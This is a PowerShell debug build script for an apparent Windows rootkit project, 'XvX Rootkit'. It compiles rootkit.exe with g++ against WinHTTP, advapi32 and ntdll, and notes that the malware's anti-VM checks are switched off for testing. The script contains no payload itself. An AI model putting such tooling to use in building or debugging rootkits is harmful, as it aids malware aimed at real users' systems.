#!/usr/bin/env pwsh
<#
.SYNOPSIS
    XvX Rootkit - DEBUG Build Script
    Copyright (c) 2025 - 28zaakypro@proton.me

.DESCRIPTION
    Compiles rootkit.exe in DEBUG mode with console output for testing.
    Use this for development/debugging only!

.EXAMPLE
    .\build_debug.ps1
#>

$ErrorActionPreference = "Stop"

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  XvX Rootkit - DEBUG Build" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

$RootDir = $PSScriptRoot

Write-Host "[*] Compiling rootkit.exe in DEBUG mode..." -ForegroundColor Yellow

Push-Location "$RootDir\src"
try {
    # DEBUG build: console output enabled
    $output = & g++ -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" main.cpp -o rootkit.exe `
        -lwinhttp -ladvapi32 -lntdll -lpthread `
        -D_DEBUG -g -O0 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "rootkit.exe")) {
        $size = (Get-Item "rootkit.exe").Length / 1KB
        Write-Host "  [+] DEBUG rootkit.exe compiled ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
        Write-Host "  [i] Console output ENABLED" -ForegroundColor Yellow
        Write-Host "  [i] Anti-VM checks DISABLED" -ForegroundColor Yellow
        Write-Host "  [i] All debug logs ACTIVE`n" -ForegroundColor Yellow
    } else {
        Write-Host "  [!] ERROR compiling rootkit.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
    }
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
} finally {
    Pop-Location
}
